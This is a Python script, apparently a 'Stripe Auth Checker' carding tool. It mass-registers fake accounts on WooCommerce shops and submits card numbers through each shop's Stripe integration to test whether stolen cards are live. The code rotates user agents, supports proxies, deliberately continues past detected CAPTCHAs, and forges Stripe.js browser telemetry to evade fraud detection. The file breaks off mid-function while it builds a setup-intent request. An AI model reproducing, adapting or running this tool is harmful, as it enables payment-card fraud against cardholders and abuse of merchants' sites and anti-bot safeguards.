#!/usr/bin/env python3
"""
Stripe Auth Checker
Automatically creates accounts and adds payment methods to Stripe-powered sites
Based on actual WooCommerce + Stripe flow
"""

import requests
import re
import json
import time
import random
import uuid
from typing import Dict, Optional, Tuple
from urllib.parse import urljoin, urlparse
from datetime import datetime


class StripeAuthChecker:
    def __init__(self, domain: str, proxy: Optional[str] = None):
        """
        Initialize the Stripe Auth Checker
        
        Args:
            domain: Domain of the site (e.g., "example.com")
            proxy: Optional proxy in format "ip:port" or "user:pass@ip:port"
        """
        self.domain = domain.rstrip('/')
        if not self.domain.startswith('http'):
            self.domain = f"https://{self.domain}"
        
        self.session = requests.Session()
        
        # Random user agent pool
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        ]
        
        self.set_random_user_agent()
        
        # Set default headers
        self.session.headers.update({
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Sec-GPC': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Priority': 'u=0, i',
        })
        
        if proxy:
            # Format proxy for requests library
            # Supports: ip:port or ip:port:user:pass
            formatted_proxy = self._format_proxy(proxy)
            self.session.proxies = {
                'http': f'http://{formatted_proxy}',
                'https': f'http://{formatted_proxy}'
            }
            self.log(f"Using proxy: {formatted_proxy}")
        
        # Session tracking
        self.session_start_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        self.session_pages = 0
        self.account_created = False
        self.account_email = None
        self.register_nonce = None
        self.payment_nonce = None
        self.create_setup_intent_nonce = None
        self.create_and_confirm_setup_intent_nonce = None  # For Pattern 2
        self.stripe_publishable_key = None
        self.stripe_account_id = None
        self.pm_id = None
        self.guid = None
        self.muid = None
        self.sid = None
        self.stripe_pattern = None  # 'pattern1' or 'pattern2'
        
    def _format_proxy(self, proxy: str) -> str:
        """
        Format proxy string for requests library
        Converts:
        - ip:port -> ip:port
        - ip:port:user:pass -> user:pass@ip:port
        """
        if not proxy:
            return None
        
        parts = proxy.split(':')
        if len(parts) == 2:
            # ip:port format
            return proxy
        elif len(parts) == 4:
            # ip:port:user:pass format -> convert to user:pass@ip:port
            ip, port, user, password = parts
            return f"{user}:{password}@{ip}:{port}"
        else:
            # Unknown format, return as-is (might be already formatted)
            return proxy
    
    def set_random_user_agent(self):
        """Set a random user agent"""
        ua = random.choice(self.user_agents)
        self.session.headers['User-Agent'] = ua
        self.log(f"Using User-Agent: {ua[:50]}...")
    
    def log(self, message: str, level: str = "INFO"):
        """Print progress message"""
        timestamp = time.strftime("%H:%M:%S")
        print(f"[{timestamp}] [{level}] {message}")
    
    def generate_email(self) -> str:
        """Generate a random email address"""
        domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com', 'protonmail.com']
        username = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=10))
        domain = random.choice(domains)
        return f"{username}@{domain}"
    
    def generate_password(self) -> str:
        """Generate a random password"""
        return ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%', k=12))
    
    def extract_field(self, html: str, pattern: str, default: str = None) -> Optional[str]:
        """Extract field from HTML using regex"""
        match = re.search(pattern, html, re.IGNORECASE | re.DOTALL)
        return match.group(1) if match else default
    
    def extract_json_var(self, html: str, var_name: str) -> Optional[dict]:
        """Extract JSON variable from JavaScript in HTML"""
        # First, try to find the variable assignment
        # Look for: var wcpay_upe_config = {...};
        # Handle both minified and formatted JSON
        
        # Pattern 1: Find the start of the JSON object after the variable name
        # Match: var wcpay_upe_config = { ... };
        pattern1 = rf'var\s+{var_name}\s*=\s*({{)'
        match1 = re.search(pattern1, html, re.IGNORECASE)
        
        if match1:
            start_pos = match1.end() - 1  # Position of the opening brace
            brace_count = 0
            in_string = False
            escape_next = False
            json_str = ''
            i = start_pos
            
            # Manually extract the JSON by counting braces
            while i < len(html):
                char = html[i]
                
                if escape_next:
                    json_str += char
                    escape_next = False
                    i += 1
                    continue
                
                if char == '\\':
                    json_str += char
                    escape_next = True
                    i += 1
                    continue
                
                if char == '"' and not escape_next:
                    in_string = not in_string
                    json_str += char
                elif not in_string:
                    if char == '{':
                        brace_count += 1
                        json_str += char
                    elif char == '}':
                        brace_count -= 1
                        json_str += char
                        if brace_count == 0:
                            # Found the closing brace
                            break
                    else:
                        json_str += char
                else:
                    json_str += char
                
                i += 1
            
            if brace_count == 0 and json_str:
                try:
                    return json.loads(json_str)
                except json.JSONDecodeError:
                    # Try to fix common JSON issues
                    try:
                        # Remove trailing commas before } or ]
                        json_str = re.sub(r',(\s*[}\]])', r'\1', json_str)
                        # Remove comments (not standard JSON but sometimes present)
                        json_str = re.sub(r'//.*?$', '', json_str, flags=re.MULTILINE)
                        json_str = re.sub(r'/\*.*?\*/', '', json_str, flags=re.DOTALL)
                        return json.loads(json_str)
                    except:
                        pass
        
        # Fallback: Try regex patterns for simpler cases
        patterns = [
            # Pattern 2: Simple assignment
            rf'{var_name}\s*=\s*({{[^{{}}]*}})',
            # Pattern 3: With quotes in key
            rf'"{var_name}"\s*:\s*({{[^{{}}]*}})',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, html, re.IGNORECASE | re.DOTALL)
            if match:
                try:
                    json_str = match.group(1)
                    return json.loads(json_str)
                except:
                    continue
        
        return None
    
    def detect_requirements(self, html: str) -> Dict[str, bool]:
        """
        Detect what's required for account creation
        
        Returns:
            Dict with 'email', 'phone', 'captcha' requirements
        """
        requirements = {
            'email': False,
            'phone': False,
            'captcha': False
        }
        
        # Check for email field
        if re.search(r'type=["\']email["\']|name=["\'][^"\']*email[^"\']*["\']', html, re.IGNORECASE):
            requirements['email'] = True
        
        # Check for phone field
        if re.search(r'type=["\']tel["\']|name=["\'][^"\']*phone[^"\']*["\']', html, re.IGNORECASE):
            requirements['phone'] = True
        
        # Check for captcha (reCAPTCHA, hCaptcha, etc.)
        if re.search(r'recaptcha|hcaptcha|captcha|g-recaptcha|data-sitekey|cf-turnstile', html, re.IGNORECASE):
            requirements['captcha'] = True
        
        return requirements
    
    def step1_visit_account_page(self) -> Tuple[bool, str]:
        """Step 1: Visit the site at /my-account/"""
        self.log("=" * 60)
        self.log("Step 1: Visiting account page")
        self.log("=" * 60)
        
        try:
            url = urljoin(self.domain, '/my-account/')
            self.log(f"GET {url}")
            
            response = self.session.get(url, timeout=30, allow_redirects=True)
            self.session_pages += 1
            
            if response.status_code != 200:
                self.log(f"Failed to load account page. Status: {response.status_code}", "ERROR")
                return False, ""
            
            self.log(f"Successfully loaded account page (Status: {response.status_code})")
            return True, response.text
            
        except Exception as e:
            self.log(f"Error visiting account page: {str(e)}", "ERROR")
            return False, ""
    
    def step2_check_requirements(self, html: str) -> Tuple[bool, Dict[str, bool]]:
        """
        Step 2: Check what's required for account creation
        
        Returns:
            Tuple of (success, requirements_dict)
        """
        self.log("=" * 60)
        self.log("Step 2: Checking account creation requirements")
        self.log("=" * 60)
        
        requirements = self.detect_requirements(html)
        
        self.log(f"Requirements detected - Email: {requirements['email']}, Phone: {requirements['phone']}, Captcha: {requirements['captcha']}")
        
        if requirements['captcha']:
            self.log("Site requires CAPTCHA verification (ignoring and continuing anyway)", "WARNING")
            # Continue anyway - don't return False
        
        if not requirements['email']:
            self.log("No email field found. Cannot create account with email-only method.", "ERROR")
            return False, requirements
        
        self.log("Requirements check passed!")
        return True, requirements
    
    def step3_extract_register_nonce(self, html: str) -> bool:
        """Step 3: Extract registration nonce from account page"""
        self.log("=" * 60)
        self.log("Step 3: Extracting registration nonce")
        self.log("=" * 60)
        
        # Extract woocommerce-register-nonce
        self.register_nonce = self.extract_field(
            html, 
            r'name=["\']woocommerce-register-nonce["\']\s+value=["\']([^"\']+)["\']'
        )
        
        if not self.register_nonce:
            self.log("Registration nonce not found!", "ERROR")
            return False
        
        self.log(f"Extracted registration nonce: {self.register_nonce}")
        return True
    
    def step4_create_account(self) -> bool:
        """Step 4: Create account"""
        self.log("=" * 60)
        self.log("Step 4: Creating account")
        self.log("=" * 60)
        
        try:
            # Generate account credentials
            self.account_email = self.generate_email()
            password = self.generate_password()
            
            self.log(f"Generated email: {self.account_email}")
            
            # Prepare registration URL
            url = urljoin(self.domain, '/my-account/?action=register')
            
            # Prepare registration data (matching request2.txt)
            data = {
                'email': self.account_email,
                'password': password,
                'email_2': '',  # Anti-spam trap
                'wc_order_attribution_source_type': 'typein',
                'wc_order_attribution_referrer': '(none)',
                'wc_order_attribution_utm_campaign': '(none)',
                'wc_order_attribution_utm_source': '(direct)',
                'wc_order_attribution_utm_medium': '(none)',
                'wc_order_attribution_utm_content': '(none)',
                'wc_order_attribution_utm_id': '(none)',
                'wc_order_attribution_utm_term': '(none)',
                'wc_order_attribution_utm_source_platform': '(none)',
                'wc_order_attribution_utm_creative_format': '(none)',
                'wc_order_attribution_utm_marketing_tactic': '(none)',
                'wc_order_attribution_session_entry': urljoin(self.domain, '/my-account/'),
                'wc_order_attribution_session_start_time': self.session_start_time.replace(' ', '+'),
                'wc_order_attribution_session_pages': str(self.session_pages),
                'wc_order_attribution_session_count': '1',
                'wc_order_attribution_user_agent': self.session.headers['User-Agent'],
                'woocommerce-register-nonce': self.register_nonce,
                '_wp_http_referer': '/my-account/',
                'register': 'Register',
            }
            
            # Update headers for POST request
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': self.domain,
                'Referer': urljoin(self.domain, '/my-account/'),
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
            }
            
            self.log(f"POST {url}")
            
            response = self.session.post(url, data=data, headers=headers, timeout=30, allow_redirects=False)
            self.session_pages += 1
            
            # Check if registration was successful (redirect to dashboard or 200 with logged-in indicators)
            if response.status_code in [200, 302, 303]:
                # Check for success indicators
                if response.status_code in [302, 303]:
                    self.account_created = True
                    self.log("Account created successfully! (Redirect)")
                    return True
                elif 'logged-in' in response.text.lower() or 'dashboard' in response.text.lower():
                    self.account_created = True
                    self.log("Account created successfully! (Logged in)")
                    return True
                else:
                    # Check for errors
                    error_msg = self.extract_field(
                        response.text, 
                        r'<ul class=["\']woocommerce-error["\']>(.*?)</ul>',
                        ''
                    )
                    if error_msg:
                        self.log(f"Registration error: {error_msg[:100]}", "ERROR")
                    else:
                        self.log(f"Registration may have failed. Status: {response.status_code}", "WARNING")
                        # Sometimes it still works even if status is 200
                        self.account_created = True
                        return True
            
            self.log(f"Registration failed. Status: {response.status_code}", "ERROR")
            return False
            
        except Exception as e:
            self.log(f"Error creating account: {str(e)}", "ERROR")
            return False
    
    def step5_load_payment_method_page(self) -> Tuple[bool, str]:
        """Step 5: Request /my-account/add-payment-method/"""
        self.log("=" * 60)
        self.log("Step 5: Loading payment method page")
        self.log("=" * 60)
        
        try:
            url = urljoin(self.domain, '/my-account/add-payment-method/')
            self.log(f"GET {url}")
            
            response = self.session.get(url, timeout=30)
            self.session_pages += 1
            
            if response.status_code != 200:
                self.log(f"Failed to load payment method page. Status: {response.status_code}", "ERROR")
                return False, ""
            
            html = response.text
            
            # Extract payment method nonce
            self.payment_nonce = self.extract_field(
                html, 
                r'name=["\']woocommerce-add-payment-method-nonce["\']\s+value=["\']([^"\']+)["\']'
            )
            
            # Detect pattern and extract configuration
            # Pattern 1: wcpay_upe_config (WooCommerce Payments)
            # Pattern 2: wc_stripe_upe_params (WooCommerce Stripe Gateway)
            wcpay_config = self.extract_json_var(html, 'wcpay_upe_config')
            wc_stripe_config = self.extract_json_var(html, 'wc_stripe_upe_params')
            
            if wcpay_config:
                # Pattern 1 detected
                self.stripe_pattern = 'pattern1'
                self.stripe_publishable_key = wcpay_config.get('publishableKey')
                self.stripe_account_id = wcpay_config.get('accountId')
                self.create_setup_intent_nonce = wcpay_config.get('createSetupIntentNonce')
                
                self.log("Pattern 1 detected: wcpay_upe_config (WooCommerce Payments)")
                self.log(f"Extracted Stripe publishable key: {self.stripe_publishable_key[:30] if self.stripe_publishable_key else 'None'}...")
                self.log(f"Extracted Stripe account ID: {self.stripe_account_id or 'None'}")
                self.log(f"Extracted create setup intent nonce: {self.create_setup_intent_nonce or 'None'}")
            elif wc_stripe_config:
                # Pattern 2 detected
                self.stripe_pattern = 'pattern2'
                self.stripe_publishable_key = wc_stripe_config.get('key')
                self.create_and_confirm_setup_intent_nonce = wc_stripe_config.get('createAndConfirmSetupIntentNonce')
                
                self.log("Pattern 2 detected: wc_stripe_upe_params (WooCommerce Stripe Gateway)")
                self.log(f"Extracted Stripe publishable key: {self.stripe_publishable_key[:30] if self.stripe_publishable_key else 'None'}...")
                self.log(f"Extracted create and confirm setup intent nonce: {self.create_and_confirm_setup_intent_nonce or 'None'}")
            else:
                self.log("Neither wcpay_upe_config nor wc_stripe_upe_params found, trying fallback extraction", "WARNING")
            
            # Fallback: try to extract from HTML directly using regex
            if not self.stripe_publishable_key:
                # Try Pattern 1 key field
                self.stripe_publishable_key = self.extract_field(
                    html,
                    r'"publishableKey"\s*:\s*"([^"]+)"'
                )
                # Try Pattern 2 key field
                if not self.stripe_publishable_key:
                    self.stripe_publishable_key = self.extract_field(
                        html,
                        r'"key"\s*:\s*"([^"]+)"'
                    )
                # Try direct pk_live pattern
                if not self.stripe_publishable_key:
                    pk_match = self.extract_field(html, r'pk_live_([a-zA-Z0-9_]+)')
                    if pk_match:
                        self.stripe_publishable_key = f'pk_live_{pk_match}'
                
                if self.stripe_publishable_key and not self.stripe_publishable_key.startswith('pk_'):
                    self.stripe_publishable_key = f'pk_live_{self.stripe_publishable_key}'
                if self.stripe_publishable_key:
                    self.log(f"Extracted Stripe key via fallback: {self.stripe_publishable_key[:30]}...")
            
            if not self.stripe_account_id and not self.stripe_pattern == 'pattern2':
                # Pattern 1 only
                self.stripe_account_id = self.extract_field(
                    html,
                    r'"accountId"\s*:\s*"([^"]+)"'
                )
                if self.stripe_account_id:
                    self.log(f"Extracted account ID via fallback: {self.stripe_account_id}")
            
            # Extract Pattern 1 nonce if not already extracted
            if not self.create_setup_intent_nonce:
                # Try multiple patterns to find createSetupIntentNonce
                # Handle both escaped and unescaped JSON
                patterns = [
                    # Standard JSON: "createSetupIntentNonce":"value" (simple, most common)
                    r'"createSetupIntentNonce"\s*:\s*"([a-zA-Z0-9]+)"',
                    # Escaped JSON in HTML: \"createSetupIntentNonce\":\"value\"
                    r'\\?"createSetupIntentNonce\\?"\s*:\s*\\?"([a-zA-Z0-9]+)\\"?',
                    # Any quotes: createSetupIntentNonce":"value" or 'createSetupIntentNonce':'value'
                    r'createSetupIntentNonce["\']?\s*:\s*["\']([a-zA-Z0-9]{8,15})["\']',
                    # More flexible: any characters between quotes
                    r'"createSetupIntentNonce"\s*:\s*"([^"]+)"',
                ]
                
                for pattern in patterns:
                    match = re.search(pattern, html, re.IGNORECASE)
                    if match:
                        self.create_setup_intent_nonce = match.group(1)
                        # Clean up any escaped characters
                        self.create_setup_intent_nonce = self.create_setup_intent_nonce.replace('\\"', '"').replace('\\\\', '\\')
                        # Remove any quotes that might be at the start/end
                        self.create_setup_intent_nonce = self.create_setup_intent_nonce.strip('"\'')
                        if self.create_setup_intent_nonce:
                            self.log(f"Extracted create setup intent nonce via regex: {self.create_setup_intent_nonce}")
                            break
                
                if not self.create_setup_intent_nonce:
                    self.log("Warning: createSetupIntentNonce not found with regex patterns", "WARNING")
                    # Try to find it in the raw HTML for debugging
                    if 'createSetupIntentNonce' in html or 'createSetupIntentNonce' in html.replace('\\', ''):
                        self.log("Found 'createSetupIntentNonce' string in HTML, trying to extract manually", "WARNING")
                        # Find the position (try both escaped and unescaped)
                        idx = html.find('createSetupIntentNonce')
                        if idx == -1:
                            idx = html.find('createSetupIntentNonce'.replace('"', '\\"'))
                        
                        if idx > 0:
                            # Look for the value after the colon (check next 300 chars)
                            snippet = html[idx:idx+300]
                            # Try various patterns in the snippet
                            value_patterns = [
                                r':\s*"([a-zA-Z0-9]{8,15})"',
                                r':\s*\\?"([a-zA-Z0-9]{8,15})\\"?',
                                r':\s*"([^"]+)"',
                                r":\s*'([^']+)'",
                            ]
                            
                            for vp in value_patterns:
                                quote_match = re.search(vp, snippet)
                                if quote_match:
                                    self.create_setup_intent_nonce = quote_match.group(1).replace('\\"', '"').strip('"\'')
                                    if self.create_setup_intent_nonce:
                                        self.log(f"Extracted create setup intent nonce manually: {self.create_setup_intent_nonce}")
                                        break
                            
                            if not self.create_setup_intent_nonce:
                                self.log(f"HTML snippet around createSetupIntentNonce: {snippet[:300]}", "DEBUG")
            
            # Extract Pattern 2 nonce if not already extracted
            if not self.create_and_confirm_setup_intent_nonce:
                # Try multiple patterns to find createAndConfirmSetupIntentNonce
                patterns = [
                    r'"createAndConfirmSetupIntentNonce"\s*:\s*"([a-zA-Z0-9]+)"',
                    r'\\?"createAndConfirmSetupIntentNonce\\?"\s*:\s*\\?"([a-zA-Z0-9]+)\\"?',
                    r'createAndConfirmSetupIntentNonce["\']?\s*:\s*["\']([a-zA-Z0-9]{8,15})["\']',
                    r'"createAndConfirmSetupIntentNonce"\s*:\s*"([^"]+)"',
                ]
                
                for pattern in patterns:
                    match = re.search(pattern, html, re.IGNORECASE)
                    if match:
                        self.create_and_confirm_setup_intent_nonce = match.group(1)
                        self.create_and_confirm_setup_intent_nonce = self.create_and_confirm_setup_intent_nonce.replace('\\"', '"').replace('\\\\', '\\').strip('"\'')
                        if self.create_and_confirm_setup_intent_nonce:
                            self.log(f"Extracted create and confirm setup intent nonce via regex: {self.create_and_confirm_setup_intent_nonce}")
                            break
                
                if not self.create_and_confirm_setup_intent_nonce and 'createAndConfirmSetupIntentNonce' in html:
                    self.log("Found 'createAndConfirmSetupIntentNonce' in HTML, trying manual extraction", "WARNING")
                    idx = html.find('createAndConfirmSetupIntentNonce')
                    if idx > 0:
                        snippet = html[idx:idx+300]
                        value_patterns = [
                            r':\s*"([a-zA-Z0-9]{8,15})"',
                            r':\s*\\?"([a-zA-Z0-9]{8,15})\\"?',
                            r':\s*"([^"]+)"',
                        ]
                        for vp in value_patterns:
                            quote_match = re.search(vp, snippet)
                            if quote_match:
                                self.create_and_confirm_setup_intent_nonce = quote_match.group(1).replace('\\"', '"').strip('"\'')
                                if self.create_and_confirm_setup_intent_nonce:
                                    self.log(f"Extracted create and confirm setup intent nonce manually: {self.create_and_confirm_setup_intent_nonce}")
                                    break
            
            # Auto-detect pattern if not already detected
            if not self.stripe_pattern:
                if self.create_and_confirm_setup_intent_nonce and not self.create_setup_intent_nonce:
                    self.stripe_pattern = 'pattern2'
                    self.log("Auto-detected Pattern 2 based on nonce extraction")
                elif self.create_setup_intent_nonce:
                    self.stripe_pattern = 'pattern1'
                    self.log("Auto-detected Pattern 1 based on nonce extraction")
                else:
                    # Default to pattern 1 if we can't determine
                    self.stripe_pattern = 'pattern1'
                    self.log("Could not determine pattern, defaulting to Pattern 1", "WARNING")
            
            if self.payment_nonce:
                self.log(f"Extracted payment method nonce: {self.payment_nonce}")
            else:
                self.log("Warning: Payment method nonce not found", "WARNING")
            
            if not self.stripe_publishable_key:
                self.log("Stripe publishable key not found!", "ERROR")
                return False, html
            
            return True, html
            
        except Exception as e:
            self.log(f"Error loading payment method page: {str(e)}", "ERROR")
            return False, ""
    
    def step6_generate_stripe_ids(self):
        """Step 6: Generate Stripe GUID, MUID, and SID"""
        self.log("=" * 60)
        self.log("Step 6: Generating Stripe session IDs")
        self.log("=" * 60)
        
        # Generate UUIDs for Stripe session tracking
        self.guid = str(uuid.uuid4()) + str(uuid.uuid4()).replace('-', '')[:16]
        self.muid = str(uuid.uuid4())
        self.sid = str(uuid.uuid4())
        
        self.log(f"Generated GUID: {self.guid[:40]}...")
        self.log(f"Generated MUID: {self.muid}")
        self.log(f"Generated SID: {self.sid}")
    
    def step7_tokenize_card_stripe(self, cc: str, mm: str, yyyy: str, cvv: str) -> bool:
        """Step 7: Request Stripe to create payment method (get pm_id)"""
        self.log("=" * 60)
        self.log("Step 7: Tokenizing card with Stripe")
        self.log("=" * 60)
        
        try:
            if not self.stripe_publishable_key:
                self.log("Stripe publishable key not found!", "ERROR")
                return False
            
            stripe_url = "https://api.stripe.com/v1/payment_methods"
            
            # Format card number (add spaces)
            cc_formatted = ' '.join([cc[i:i+4] for i in range(0, len(cc), 4)])
            
            # Format expiry year (2 digits)
            yy = yyyy[-2:] if len(yyyy) == 4 else yyyy
            
            # Generate time on page (random between 100000 and 300000)
            time_on_page = random.randint(100000, 300000)
            
            # Generate client session ID
            client_session_id = str(uuid.uuid4())
            
            data = {
                'billing_details[name]': ' ',
                'billing_details[email]': self.account_email,
                'billing_details[address][country]': 'US',
                'billing_details[address][postal_code]': '11019',
                'type': 'card',
                'card[number]': cc_formatted,
                'card[cvc]': cvv,
                'card[exp_year]': yy,
                'card[exp_month]': mm.zfill(2),
                'allow_redisplay': 'unspecified',
                'payment_user_agent': 'stripe.js/0eddba596b; stripe-js-v3/0eddba596b; payment-element; deferred-intent',
                'referrer': self.domain,
                'time_on_page': str(time_on_page),
                'client_attribution_metadata[client_session_id]': client_session_id,
                'client_attribution_metadata[merchant_integration_source]': 'elements',
                'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
                'client_attribution_metadata[merchant_integration_version]': '2021',
                'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
                'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
                'client_attribution_metadata[elements_session_config_id]': str(uuid.uuid4()),
                'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
                'guid': self.guid,
                'muid': self.muid,
                'sid': self.sid,
                'key': self.stripe_publishable_key,
            }
            
            # Add Stripe account if available
            if self.stripe_account_id:
                data['_stripe_account'] = self.stripe_account_id
            
            headers = {
                'Accept': 'application/json',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br, zstd',
                'Referer': 'https://js.stripe.com/',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://js.stripe.com',
                'Sec-GPC': '1',
                'Connection': 'keep-alive',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-site',
                'Priority': 'u=6',
                'User-Agent': self.session.headers['User-Agent'],
            }
            
            self.log(f"POST {stripe_url}")
            
            response = requests.post(stripe_url, data=data, headers=headers, timeout=30)
            
            if response.status_code == 200:
                json_response = response.json()
                if 'id' in json_response:
                    self.pm_id = json_response['id']
                    self.log(f"Card tokenized successfully! PM ID: {self.pm_id}")
                    return True
                else:
                    error = json_response.get('error', {}).get('message', 'Unknown error')
                    self.log(f"Stripe tokenization failed: {error}", "ERROR")
                    return False
            else:
                error_data = response.json() if response.content else {}
                error = error_data.get('error', {}).get('message', 'Unknown error')
                self.log(f"Stripe tokenization failed. Status: {response.status_code}, Error: {error}", "ERROR")
                return False
                
        except Exception as e:
            self.log(f"Error tokenizing card: {str(e)}", "ERROR")
            return False
    
    def _parse_setup_intent_response(self, response) -> Tuple[bool, Dict]:
        """Parse the setup intent response (common for both patterns)"""
        # Store raw response
        raw_response_text = response.text if response.text else ''
        raw_response_json = None
        
        # Parse response
        result = {
            'success': False,
            'status': 'UNKNOWN',
            'message': '',
            'raw_response': raw_response_text,
            'raw_response_json': None,
            'status_code': response.status_code,
        }
        
        if response.status_code == 200:
            try:
                json_response = response.json()
                raw_response_json = json_response
                result['raw_response_json'] = json_response
                result['raw_response'] = json.dumps(json_response, indent=2)
                
                if json_response.get('success'):
                    result['success'] = True
                    result['status'] = 'SUCCESS'
                    
                    # Extract actual message from response
                    message = 'Card added successfully'  # Default fallback
                    
                    # Try to get message from data.status or data.message
                    if 'data' in json_response and isinstance(json_response['data'], dict):
                        if 'status' in json_response['data']:
                            status = json_response['data']['status']
                            if status == 'succeeded':
                                message = 'Payment method added successfully'
                            elif status == 'requires_action':
                                message = 'Payment method requires additional action'
                            else:
                                message = f'Status: {status}'
                        elif 'message' in json_response['data']:
                            message = json_response['data']['message']
                        # Also check for any descriptive text
                        elif 'payment_method' in json_response['data']:
                            message = 'Payment method added successfully'
                    elif 'message' in json_response:
                        message = json_response['message']
                    
                    result['message'] = message
                    self.log(f"Card validation SUCCESS! Message: {message}")
                else:
                    # Extract error message from nested structure (success: false in JSON)
                    error_msg = 'Card validation failed'  # Default fallback
                    
                    # Try multiple paths to find error message
                    # Priority: data.error.message > data.error > error.message > error > message
                    if 'data' in json_response and isinstance(json_response['data'], dict):
                        if 'error' in json_response['data']:
                            if isinstance(json_response['data']['error'], dict):
                                error_msg = json_response['data']['error'].get('message', 'Card validation failed')
                                # Also check for nested message
                                if not error_msg or error_msg == 'Card validation failed':
                                    error_msg = json_response['data'].get('message', error_msg)
                            elif isinstance(json_response['data']['error'], str):
                                error_msg = json_response['data']['error']
                        elif 'message' in json_response['data']:
                            error_msg = json_response['data']['message']
                    elif 'error' in json_response:
                        if isinstance(json_response['error'], dict):
                            error_msg = json_response['error'].get('message', 'Card validation failed')
                        elif isinstance(json_response['error'], str):
                            error_msg = json_response['error']
                    elif 'message' in json_response:
                        error_msg = json_response['message']
                    
                    # Clean up error message (remove "Error: " prefix if present)
                    if error_msg.startswith('Error: '):
                        error_msg = error_msg[7:]
                    elif error_msg.startswith('error: '):
                        error_msg = error_msg[7:]
                    
                    result['success'] = False
                    result['status'] = 'ERROR'
                    result['message'] = error_msg
                    
                    self.log(f"Card validation ERROR: {error_msg}", "ERROR")
                    
            except json.JSONDecodeError as e:
                # Not valid JSON, try to parse as text
                result['raw_response'] = raw_response_text
                self.log(f"Response is not valid JSON: {str(e)}", "WARNING")
                
                if 'success' in raw_response_text.lower() and 'true' in raw_response_text.lower():
                    result['success'] = True
                    result['status'] = 'SUCCESS'
                    # Try to extract message from text response
                    # Look for common patterns in the response
                    if 'succeeded' in raw_response_text.lower():
                        result['message'] = 'Payment method added successfully'
                    elif 'added' in raw_response_text.lower():
                        result['message'] = 'Payment method added successfully'
                    else:
                        result['message'] = 'Card added successfully'
                    self.log(f"Card validation SUCCESS! (Parsed from text) Message: {result['message']}")
                else:
                    result['success'] = False
                    result['status'] = 'FAILED'
                    result['message'] = raw_response_text[:500] if raw_response_text else 'Empty response'
                    self.log(f"Card validation FAILED: {result['message']}", "ERROR")
        else:
            # Status code is not 200, but try to parse JSON anyway (might contain error details)
            result['success'] = False
            result['status'] = 'FAILED'
            
            # Try to parse JSON response even if status code is not 200
            error_msg = f'HTTP {response.status_code}'  # Default fallback
            try:
                json_response = response.json()
                raw_response_json = json_response
                result['raw_response_json'] = json_response
                result['raw_response'] = json.dumps(json_response, indent=2)
                
                # Extract error message from nested structure
                if 'data' in json_response and isinstance(json_response['data'], dict):
                    if 'error' in json_response['data']:
                        if isinstance(json_response['data']['error'], dict):
                            error_msg = json_response['data']['error'].get('message', error_msg)
                        elif isinstance(json_response['data']['error'], str):
                            error_msg = json_response['data']['error']
                elif 'error' in json_response:
                    if isinstance(json_response['error'], dict):
                        error_msg = json_response['error'].get('message', error_msg)
                    elif isinstance(json_response['error'], str):
                        error_msg = json_response['error']
                elif 'message' in json_response:
                    error_msg = json_response['message']
                elif json_response.get('success') is False:
                    # If success is false, try to find any error message
                    if 'data' in json_response and isinstance(json_response['data'], dict):
                        error_msg = json_response['data'].get('message', error_msg)
                
                # Clean up error message (remove "Error: " prefix if present)
                if isinstance(error_msg, str):
                    if error_msg.startswith('Error: '):
                        error_msg = error_msg[7:]
                    elif error_msg.startswith('error: '):
                        error_msg = error_msg[7:]
            except (json.JSONDecodeError, ValueError, AttributeError):
                # Not valid JSON, use raw response text if available
                result['raw_response'] = raw_response_text
                if raw_response_text:
                    # Try to extract error from text
                    error_msg = raw_response_text[:200] if len(raw_response_text) > 200 else raw_response_text
            
            result['message'] = error_msg
            self.log(f"Card validation failed. Status: {response.status_code}, Error: {error_msg}", "ERROR")
        
        return result['success'], result
    
    def step8_create_setup_intent_pattern1(self) -> Tuple[bool, Dict]:
        """Step 8 Pattern 1: Create setup intent with WooCommerce Payments (multipart/form-data)"""
        self.log("Trying Pattern 1: create_setup_intent (multipart/form-data)")
        
        if not self.create_setup_intent_nonce:
            self.log("Pattern 1 nonce (createSetupIntentNonce) not found!", "ERROR")
            return False, {}
        
        url = urljoin(self.domain, '/wp-admin/admin-ajax.php')
        
        # Prepare multipart form data
        boundary_suffix = ''.join(random.choices('0123456789abcdef', k=32))
        boundary = f'----geckoformboundary{boundary_suffix}'
        
        # Build multipart form data manually
        body_parts = []
        body_parts.append(f'------geckoformboundary{boundary_suffix}')
        body_parts.append('Content-Disposition: form-data; name="action"')
        body_parts.append('')
        body_parts.append('create_setup_intent')
        body_parts.append(f'------geckoformboundary{boundary_suffix}')
        body_parts.append('Content-Disposition: form-data; name="wcpay-payment-method"')
        body_parts.append('')
